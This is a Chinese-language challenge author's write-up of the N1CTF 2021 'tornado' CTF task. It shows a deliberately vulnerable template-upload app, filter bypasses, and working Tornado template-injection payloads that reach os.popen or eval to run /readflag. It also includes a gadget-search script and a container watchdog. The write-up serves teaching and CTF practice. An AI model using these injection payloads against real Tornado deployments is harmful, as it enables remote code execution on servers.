# tornado

N1CTF 2021 web challenge

N1CTF我出了一个tornado的模板注入，与其说是模板注入，不如说是模板上传RCE。搞了3个过滤点，个人感觉还挺有意思的，也不算难，不过最后只有两个队做出来。

题目环境和题解可以在 https://github.com/Nu1LCTF/n1ctf-2021/tree/main/Web/tornado 这里找到。

这里主要是记录一下出题的过程以及运维的情况。
## 起源

```python
import tornado.ioloop
import tornado.web
import builtins
import unicodedata
import uuid
import os
import re

def filter(data):
    data = unicodedata.normalize('NFKD',data)
    if len(data) > 1024:
        return False
    if re.search(r'__|\(|\)|datetime|sys|import',data):
        return False
    for k in builtins.__dict__.keys():
        if k in data:
            return False
    return True

class IndexHandler(tornado.web.RequestHandler):
    def get(self):
        self.render("templates/index.html",)
    def post(self):
        data = self.get_argument("data")
        if not filter(data):
            self.finish("no no no")
        else:
            id = uuid.uuid4()
            f = open(f"uploads/{id}.html",'w')
            f.write(data)
            f.close()
            try:
                self.render(f"uploads/{id}.html",)
            except:
                self.finish("error")
            os.unlink(f"uploads/{id}.html")

def make_app():
    return tornado.web.Application([
        (r"/", IndexHandler),
    ],compiled_template_cache=False)

if __name__ == "__main__":
    app = make_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()
```

这个题最开始是受@rmb122的一个tornado模板注入的启发，原题是通过unicode normalize绕过过滤。我当时在看tornado模板的时候，感觉这个模板有一点点滑稽，相比于Jinja2来说，这个模板做完词法分析之后，就把提取出来的元素，直接插入到python语句中，然后直接执行生成出来的python代码。

发现这件事情后，我尝试搞一些非预期出来，奈何原题的过滤太严格，试了一晚上也没非预期出来。所以我就想利用tornado模板引擎的特性来出一个题。

## unicode normalize

这个是我做的第一个过滤，也算是今年比较常见的一个python trick。但是我把它ban掉了，笑。

## 关键词过滤

相比于Jinja2提供的丰富内置方法比如可以获取属性的`attr`，tornado的模板就相当简陋了，而且也无法通过`[]`获得属性，这就让很多trick无法使用。同时还ban掉了双下划线，虽然有一点为了出题而出题的意味，但是其实也是考验选手能不能找到一条新的利用链。

我出题的时候预想了三种方法：

### 第一种

看完源码之后马上想到了`self.compiled`，他是模板编译出来的代码对象，可以修改其中的内容实现执行代码。

这个引擎的执行逻辑是：先将模板转换成python代码，生成的代码被套在一个叫`_tt_execute`的函数中，然后执行一次compile，生成一个`self.compiled`，然后exec这个`self.compiled`，这会在locals中产生一个`_tt_execute`函数，并且加到namespace字典中，最后把字典中的`_tt_execute`拿出来赋值给execute，最后调用execute函数，实现执行模板。

```python
class Template(object):
    def __init__():
        ...
        self.namespace = loader.namespace if loader else {}
        reader = _TemplateReader(name, escape.native_str(template_string), whitespace)
        self.file = _File(self, _parse(reader, self))
        self.code = self._generate_python(loader)
        self.loader = loader
        try:
            self.compiled = compile(
                escape.to_unicode(self.code),
                "%s.generated.py" % self.name.replace(".", "_"),
                "exec",
                dont_inherit=True,
            )
        ...
    def generate(self, **kwargs: Any) -> bytes:
        """Generate this template with the given arguments."""
        namespace = {
            "escape": escape.xhtml_escape,
            "xhtml_escape": escape.xhtml_escape,
            "url_escape": escape.url_escape,
            "json_encode": escape.json_encode,
            "squeeze": escape.squeeze,
            "linkify": escape.linkify,
            "datetime": datetime,
            "_tt_utf8": escape.utf8,  # for internal use
            "_tt_string_types": (unicode_type, bytes),
            # __name__ and __loader__ allow the traceback mechanism to find
            # the generated source code.
            "__name__": self.name.replace(".", "_"),
            "__loader__": ObjectDict(get_source=lambda name: self.code),
        }
        namespace.update(self.namespace)
        namespace.update(kwargs)
        exec_in(self.compiled, namespace)
        execute = typing.cast(Callable[[], bytes], namespace["_tt_execute"])
        linecache.clearcache()
        return execute()
```

后来我才意识到compiled在黑名单里=_=，所以不得不再找一个利用方法。

### 第二种

然后我注意到了utils.py里的`import_object`，这简直就是一个天然后门，用法就是`import_object('os.popen')`就能直接获得popen函数。

```python
def import_object(name: str) -> Any:
    if name.count(".") == 0:
        return __import__(name)

    parts = name.split(".")
    obj = __import__(".".join(parts[:-1]), fromlist=[parts[-1]])
    try:
        return getattr(obj, parts[-1])
    except AttributeError:
        raise ImportError("No module named %s" % parts[-1])
```

然后查找他的引用，发现Rule类的构造函数中，调用了`import_object`并把返回的结果存入了target

```python
class Rule(object):

    def __init__(
        self,
        matcher: "Matcher",
        target: Any,
        target_kwargs: Optional[Dict[str, Any]] = None,
        name: Optional[str] = None,
    ) -> None:
        if isinstance(target, str):
            # import the Module and instantiate the class
            # Must be a fully qualified name (module.ClassName)
            target = import_object(target)

        self.matcher = matcher  # type: Matcher
        self.target = target
        self.target_kwargs = target_kwargs if target_kwargs else {}
        self.name = name
```

而在RuleRouter中的add_rules函数里调用里Rule的构造函数，他的参数是一个Rule列表，Rule中的第二个属性target就是传给`import_object`的字符串。

```python
class RuleRouter(Router):
    """Rule-based router implementation."""

    def __init__(self, rules: Optional[_RuleList] = None) -> None:
        self.rules = []  # type: List[Rule]
        if rules:
            self.add_rules(rules)

    def add_rules(self, rules: _RuleList) -> None:
        for rule in rules:
            if isinstance(rule, (tuple, list)):
                assert len(rule) in (2, 3, 4)
                if isinstance(rule[0], basestring_type):
                    rule = Rule(PathMatches(rule[0]), *rule[1:])
                else:
                    rule = Rule(*rule)

            self.rules.append(self.process_rule(rule))

_RuleList = List[
    Union[
        "Rule",
        List[Any],  # Can't do detailed typechecking of lists.
        Tuple[Union[str, "Matcher"], Any],
        Tuple[Union[str, "Matcher"], Any, Dict[str, Any]],
        Tuple[Union[str, "Matcher"], Any, Dict[str, Any], str],
    ]
]
```

在`application`对象中存在一个`default_router`属性，是`_ApplicationRouter`的实例，而`_ApplicationRouter`继承自`ReversibleRuleRouter`，`ReversibleRuleRouter`继承自`RuleRouter`，这样在`handler.application.default_router`中就可以调用add_rules了。Rule中的最后一个元素是该Rule的名字，他会被处理并储存在named_rules中，这样找起来会比较方便。

```
{{handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])}}
{{handler.application.default_router.named_rules['345'].target('/readflag').read()}}
```

### 第三种

考虑到handler暴露出的内容实在是太多，说不定在某个角落就有一个特殊对象可以用于RCE，这个时候就要用DFS来找一下了。

这个是我当时做的一个简陋DFS，可以用于遍历对象属性、列表和字典。

```python
import os
import datetime
import sys
import traceback
import inspect

def obj_walker(obj,searcher,filter,depth=10):
    visited = set()
    
    def backtrace():
        stack = inspect.stack()
        path = []
        for i in stack:
            if(i.function == "dfs"):
                try:
                    path.append(i.frame.f_locals['name'])
                except Exception as e:
                    raise e
        print('.'.join(path[::-1]))
    
    def dfs(current,d,name,visited):
        visited = set(visited)
        if filter(name):
            return
        if searcher(current):
            backtrace()
            return
        if id(current) in visited:
            return
        if d > depth:
            return
        
        visited.add(id(current))
        for i in dir(current):
            try:
                next = getattr(current,i)
                dfs(next,d+1,i,visited)
            except AttributeError as e:
                pass
        if isinstance(current, dict):
            for k,v in current.items():
                dfs(k,d+1,f'[{k}]',visited)
                dfs(v,d+1,f'[{k}]',visited)
        if isinstance(current, list):
            i = 0
            for next in current:
                i += 1
                dfs(next,d+1,f'[{i}]',visited)
    dfs(obj,0,'',visited)

def searcher(i):
    if hasattr(i,'__name__') and i.__name__ == 'popen':
        print(i)
        return True
    return False

def filter(name):
    if '__' in name:
        return True
    return False

obj_walker(sys.modules,searcher,filter,4)
```

最后找到了一个builtins的字典`handler.request.server_connection._serving_future._coro.cr_frame.f_builtins`，下标取值就能成功获取eval函数。

不过这个`_serving_future`是什么让我很好奇，在http1connection.py文件中，找到了`start_serving`函数，tornado的协程实现较为复杂，这里简单说一下。

```python
def start_serving(self, delegate: httputil.HTTPServerConnectionDelegate) -> None:
    """Starts serving requests on this connection.

        :arg delegate: a `.HTTPServerConnectionDelegate`
        """
    assert isinstance(delegate, httputil.HTTPServerConnectionDelegate)
    fut = gen.convert_yielded(self._server_request_loop(delegate))
    self._serving_future = fut
    # Register the future on the IOLoop so its errors get logged.
    self.stream.io_loop.add_future(fut, lambda f: f.result())
...
def convert_yielded(yielded: _Yieldable) -> Future:
    if yielded is None or yielded is moment:
        return moment
    elif yielded is _null_future:
        return _null_future
    elif isinstance(yielded, (list, dict)):
        return multi(yielded)  # type: ignore
    elif is_future(yielded):
        return typing.cast(Future, yielded)
    elif isawaitable(yielded):
        return _wrap_awaitable(yielded)  # type: ignore
    else:
        raise BadYieldError("yielded unknown object %r" % (yielded,))
```

`_server_request_loop`是用于处理HTTP请求的async函数，直接调用async函数会产生一个`coroutine`对象，并把它作为参数传给`convert_yielded`。在`convert_yielded`函数中，判断yielded的类型，并进行封装。`coroutine`对象会进入最后一个elif语句中，并调用`_wrap_awaitable`，实际上就是调用`asyncio.ensure_future`，封装成一个Task。而`task._coro`就是原始协程对象，协程对象回保存协程的上下文，也就包含了frame、globals等信息。

这个也是比赛过程中成功解出题目的两只队伍使用的方法。

在比赛过程中还发现有选手尝试用`Template.generate`渲染一个新的模板，但这样需要填充Template的属性compiled，这就又遇到了该死的compile过滤（笑。

## 括号过滤

括号过滤是本题最trick的地方，同样需要阅读一下tornado的源码，理解模板引擎的运行过程。

可以在 https://github.com/tornadoweb/tornado/blob/208672f3bf6cbb7e37f54c356e02a71ca29f1e02/tornado/template.py#L320 这里加一个输出，观察一下模板引擎生成的python代码是什么样的。

```python
reader = _TemplateReader(name, escape.native_str(template_string), whitespace)
self.file = _File(self, _parse(reader, self))
self.code = self._generate_python(loader)
self.loader = loader
print(self.code)
```

当我们输入这样的模板时`{{2-1}}`，生成的python代码是这样的

```python
def _tt_execute():
    _tt_buffer = []
    _tt_append = _tt_buffer.append
    _tt_tmp = 2-1
    if isinstance(_tt_tmp, _tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp)
    else: _tt_tmp = _tt_utf8(str(_tt_tmp))
    _tt_tmp = _tt_utf8(xhtml_escape(_tt_tmp))
    _tt_append(_tt_tmp)
    return _tt_utf8('').join(_tt_buffer)
```

如果在模板内插入一个换行`{{2-1%0a    print(1)}}`，就可以插一行新语句进去，或者用分号插入新语句也可以

```python
def _tt_execute():
    _tt_buffer = []
    _tt_append = _tt_buffer.append
    _tt_tmp = 2-1
    print(1)
    if isinstance(_tt_tmp, _tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp)
    else: _tt_tmp = _tt_utf8(str(_tt_tmp))
    _tt_tmp = _tt_utf8(xhtml_escape(_tt_tmp))
    _tt_append(_tt_tmp)
    return _tt_utf8('').join(_tt_buffer)
```

这时候就可以整一些骚操作了，比如可以让`_tt_execute`提前返回。在题目中就可以把`_tt_utf8`替换成想要调用的函数，`_tt_tmp`替换成参数。不过替换后再次调用`_tt_utf8`时它可能会抱怨，所以可以先把之前的`_tt_utf8`存起来，操作完成之后再换回去。这里有一个小问题是`_tt_utf8`是外部给出的函数，并不在local作用域内，所以要先用global关键字声明一下。或者用`_tt_utf8 = lambda x:x`，重新定义一下也可以。

模板本身还提供了一个apply指令，用于函数调用。如果模板是`{%apply print%}1{%end%}`，生成的python代码就是这样的

```python
def _tt_execute():
    _tt_buffer = []
    _tt_append = _tt_buffer.append
    def _tt_apply0():
        _tt_buffer = []
        _tt_append = _tt_buffer.append
        _tt_append(b'1')
        return _tt_utf8('').join(_tt_buffer)
    _tt_append(_tt_utf8(print(_tt_apply0())))
    return _tt_utf8('').join(_tt_buffer)
```

所以可以插入一个return让`_tt_apply0`提前返回我们想要的内容，比如这样的模板`{%apply print%}{{1%0a     return 1}}{%end%}`

```python
def _tt_execute():
    _tt_buffer = []
    _tt_append = _tt_buffer.append
    def _tt_apply0():
        _tt_buffer = []
        _tt_append = _tt_buffer.append
        _tt_tmp = 1
        return 1
        if isinstance(_tt_tmp, _tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp)
        else: _tt_tmp = _tt_utf8(str(_tt_tmp))
        _tt_tmp = _tt_utf8(xhtml_escape(_tt_tmp))
        _tt_append(_tt_tmp)
        return _tt_utf8('').join(_tt_buffer)
    _tt_append(_tt_utf8(print(_tt_apply0())))
    return _tt_utf8('').join(_tt_buffer)
```

同样可以达到函数调用的目的

## 运维

出题的时候就考虑到了互相干扰的情况，暴露出来的handler可以操作整个app，但受经费影响又没法搞动态容器，所以就整了一个简陋的容器守护程序，实现了一下定时重启和进程监控。

```python
from __future__ import annotations
from os import name

import typing
import time

import docker
import schedule
from docker.models.containers import Container

config = {
    "image_name": "tornado_app:latest",
    "container_count": 1,
    "restart": "30m",
    "expose": 8888,
    "ports": [5000, 5001, 5002],
    "limit": {
        "memory": "512m",
        "process": 64
    }
}

client = docker.from_env()
running_containers: typing.Dict[str, ManagedContainer] = {}


class ManagedContainer():
    def __init__(self, container: Container):
        self.container = container
        self.name = container.name
        self.warning_count = 0

    def restart(self):
        self.container.restart(timeout=1)
        self.container.exec_run("/bin/bash -c 'rm -rf /tmp/*'")
        self.container.exec_run("/bin/bash -c 'rm -rf /app/uploads/*'")
        self.warning_count = 0
        log(f"restart {self.name}")

    def processes(self):
        return self.container.top(ps_args='aux')['Processes']

    def warning(self, warning_type: str, reason: str):
        log(f"abnormal {self.name} {reason}")
        if self.warning_count > 3:
            self.restart()
            self.warning_count = 0
            return
        self.warning_count += 1


def log(message: str):
    time_label = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    f = open("challenged.log", "a")
    print(f"{time_label} {message}")
    f.write(f"{time_label} {message}\n")
    f.close()


def restart():
    for container in running_containers.values():
        container.restart()


def check():
    for container in running_containers.values():
        processes = container.processes()
        count = len(processes)
        if count > 32:
            container.warning("proc", f"too many process({count})")
        for proc in processes:
            if float(proc[2]) > 80:  # %CPU > 80%
                container.warning(
                    "cpu", f"'{proc[-1]}' take too much cpu resource")
            if float(proc[3]) > 60:  # %MEM > 80%
                container.warning(
                    "mem", f"'{proc[-1]}' take too much memory")

def run():
    for i in range(config["container_count"]):
        name = f"challenged_{i}"
        if name in running_containers.keys():
            continue

        container = client.containers.run(
            config["image_name"],
            name=name,
            detach=True,
            ports={config["expose"]: config["ports"][i]},
            restart_policy={"Name": "always"},
            pids_limit=config["limit"]["process"],
            mem_limit=config["limit"]["memory"])

        log(f"run container {name}")
        running_containers[name] = ManagedContainer(container)
    pass


def check_running_containers():
    containers: typing.List[Container] = client.containers.list()
    for i in containers:
        if i.name.startswith("challenged_"):
            name = i.name
            log(f"add container {name}")
            running_containers[name] = ManagedContainer(i)

def stop():
    pass

if __name__ == '__main__':
    check_running_containers()
    run()
    schedule.every(10).seconds.do(check)
    schedule.every(10).minutes.do(restart)
    while 1:
        try:
            schedule.run_pending()
        except Exception as e:
            log(e)
        time.sleep(1)
```

顺便用tcpdump记录了一下大家的流量，方便偷偷观察进度。

```bash
sudo tcpdump -i docker0 -C20 -w 'docker0.pcap'
```

但是实际上并没有发挥多大作用（除了定时重启），可能是RCE的人就没几个，搞一些奇怪操作的就更没有了。我早晨8点起来运维，结果一上午就没人做到点子上，甚是难受。

做出来的两个队W&M和r3kapig的方法在预期之内，不过W&M的payload在从f_builtins取eval上面饶了好大一圈，给我也看懵了。

## 总结

自己感觉出的这个题还算可以，可惜N1CTF的时间跟好多比赛都撞了，解出来的队并不多（指两个队。希望明年能出个更有意思的题（指鬼点子。

